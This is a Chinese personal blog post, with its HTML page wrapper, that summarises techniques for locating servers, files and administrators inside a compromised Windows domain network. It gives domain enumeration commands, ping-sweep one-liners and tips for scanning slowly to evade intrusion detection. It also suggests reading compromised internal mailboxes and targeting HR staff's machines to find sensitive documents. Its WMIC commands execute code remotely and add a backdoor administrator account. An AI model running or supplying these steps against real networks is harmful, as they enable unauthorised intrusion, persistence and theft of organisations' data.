<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="内网渗透测试定位技术总结服务器（机器）定位">
    

    <!--Author-->
    
        <meta name="author" content="langke">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="内网定位总结"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="langke Blog"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>内网定位总结 - langke Blog</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about/tools/index.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2018/12/06/内网定位总结/">
                内网定位总结
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2018-12-06</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h1 id="内网渗透测试定位技术总结"><a href="#内网渗透测试定位技术总结" class="headerlink" title="内网渗透测试定位技术总结"></a>内网渗透测试定位技术总结</h1><h2 id="服务器（机器）定位"><a href="#服务器（机器）定位" class="headerlink" title="服务器（机器）定位"></a>服务器（机器）定位</h2><a id="more"></a>
<blockquote>
<p>收集域以及域内用户信息</p>
</blockquote>
<ul>
<li>收集域内域控制器信息</li>
<li>收集域控上域用户登录登录日志信息</li>
<li>收集域内所有用户名以及全名、备注等信息</li>
<li>收集域内工作组信息</li>
<li>收集域管理员账号信息</li>
<li>收集域内网段划分信息</li>
<li>收集域内组织单位信息<blockquote>
<p>常用命令</p>
</blockquote>
</li>
</ul>
<p><code>net view</code>查看域内用户列表<br><code>tasklist</code><br><code>Ipconfig /all</code> 查看网卡信息<br><code>Tasklist /v</code>  查看进程<br><code>Net use</code>查看当前主机的用户<br><code>net group /domain</code> 获得所有域用户组列表<br><code>net group “domain admins” /domain</code> 获得域管理员列表<br><code>net localgroup administrators /domain</code> 获取域内置administrators组用户（enterprise admins、domain admins）<br><code>net group “domain controllers” /domain</code> 获得域控制器列表<br><code>net group “domain computers” /domain</code> 获得所有域成员计算机列表<br><code>net user /domain</code> 获得所有域用户列表<br><code>net user someuser /domain</code> 获得指定账户someuser的详细信息<br><code>net accounts /domain</code> 获得域密码策略设置，密码长短，错误锁定等信息<br><code>nltest /domain_trusts</code> 获取域信任信息</p>
<blockquote>
<p>结构分析</p>
</blockquote>
<p>从计算机名获取IP地址：<br><code>ping 计算机名</code><br>最后把所有得到的<code>domain admins</code>账号再<code>net user</code>下，为这些信息按内容分别建立文件进行分析。（抽空写个py脚本批量整理）<br>例如：</p>
<ul>
<li>Users.txt 存放和用户信息有关的内容</li>
<li><p>Group.txt 存放和分组信息相关的内容</p>
<blockquote>
<p>信息收集的姿势：</p>
</blockquote>
</li>
<li><p>人事组织结构图<br><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/组织结构_.png" alt="来自网络"><br>像这种组织架构图网上很容易就搜到了。还可以去对应公司的官网去找。<br>然后结合分析人事资料里相关员工全称与域内用户名对应关系，很快就能定位到需要定位的人员使用的机器。</p>
</li>
<li><p>内部邮箱<br>现在一般企业对内网还不是很重视，拿下一两台主机是流程内的事。<br><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/010_2.png" alt="某知名集团"><br>然后进入内部工作邮箱，<br>可以从邮件头提取有用的信息。比如发件人IP，然后对照之前收集的，进一步确认内部人员名字以及关系。<br><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/mail_ip.png" alt=""></p>
</li>
<li><p>系统自带工具<br>控制扫描的频率和速度，可以大大降低触发IDS的风险，针对windows机器，可以考虑用wmi脚本和powershell脚本进行扫描，低频扫描可以很容易的绕过IDS的规则，同时可以考虑使用内网管理工具使用的相同协议进行扫描探测。<br><strong>内网无工具扫描</strong><br>ping命令探测C段存活主机<br><code>for /1 %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i &quot;ttl&quot;</code><br><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/ping_C.png" alt=""><br>域机器对应的IP<br><code>FOR /F &quot;eol=- tokens=1 delims=\ &quot; %a IN (&#39;net view&#39;) DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 | find /i &quot;ttl&quot; &amp; echo.)</code></p>
</li>
</ul>
<h2 id="文件定位"><a href="#文件定位" class="headerlink" title="文件定位"></a>文件定位</h2><p>结合服务器定位总结出文件定位的大致思路：</p>
<ul>
<li>定位人力资源主管个人机</li>
<li>定位人力资源相关文档存放位置</li>
<li>从人力资源文档中找相关人</li>
<li>定位相关人的机器</li>
<li>监视相关人工作时存放文档的位置</li>
<li>列出存放文档服务器的目录<br><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/file_dingwei.png" alt=""></li>
</ul>
<p>文件定位需要注意的点：</p>
<ul>
<li>产品名称</li>
<li>内部名称</li>
<li>项目负责人</li>
<li>项目团队</li>
<li>生产部（分公司，工厂，带工厂）<blockquote>
<p>经验</p>
</blockquote>
</li>
</ul>
<ol>
<li>FTP //一般用来存放文件</li>
<li>SMB //文件共享</li>
<li>产品管理系统（仓库管理系统）</li>
<li>各种数据库</li>
<li>其他服务器（分公司、工厂、代工厂）</li>
</ol>
<h2 id="管理员定位"><a href="#管理员定位" class="headerlink" title="管理员定位"></a>管理员定位</h2><blockquote>
<p>工具</p>
</blockquote>
<p>netsess.exe的原理是调用NetSessionEnum API，并且在远程主机上无需管理员权限。<br><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/NETSESS_.png" alt=""></p>
<p>PVEFindADUser.exe  // PVE查找AD用户<br>用于枚举域用户以及登陆过特定系统的用户，需要管理员权限。工具描述：corelan<br><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/内网渗透/PVE_.png" alt=""></p>
<p>上面几个工具地址：<a href="https://github.com/langkexiansheng/Intranet-penetration" target="_blank" rel="noopener">》》》</a></p>
<blockquote>
<p>powershell</p>
</blockquote>
<blockquote>
<p>WMIC</p>
</blockquote>
<ul>
<li><p>在远程系统上执行 bat 脚本<br><code>wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create c:\programdata\test.bat</code></p>
</li>
<li><p>在远程系统上执行单条命令<br><code>wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add</code></p>
</li>
<li><p>在远程系统上运行exe文件<br><code>wmic /node:192.168.200.20 /user:web\administrator /password:Web12345
process call create &quot;cmd.exe /c calc.exe&quot;</code></p>
</li>
</ul>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/内网渗透/">#内网渗透</a>
        </div>
    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>关于</h2>
                <p>
                    
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>最近的帖子</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2019/03/28/THE-HACKER-PLAYBOOK-3-笔记-安装/">THE HACKER PLAYBOOK 3 -- </a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/03/26/黑客秘笈-笔记-前置/">黑客秘笈-笔记-前置</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/03/09/深入理解web漏洞之-XSS跨站脚本攻击/">深入理解web漏洞之-XSS跨站脚本攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/03/07/深入理解web漏洞之-SQL注入/">深入理解web漏洞之 SQL注入</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Langke
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>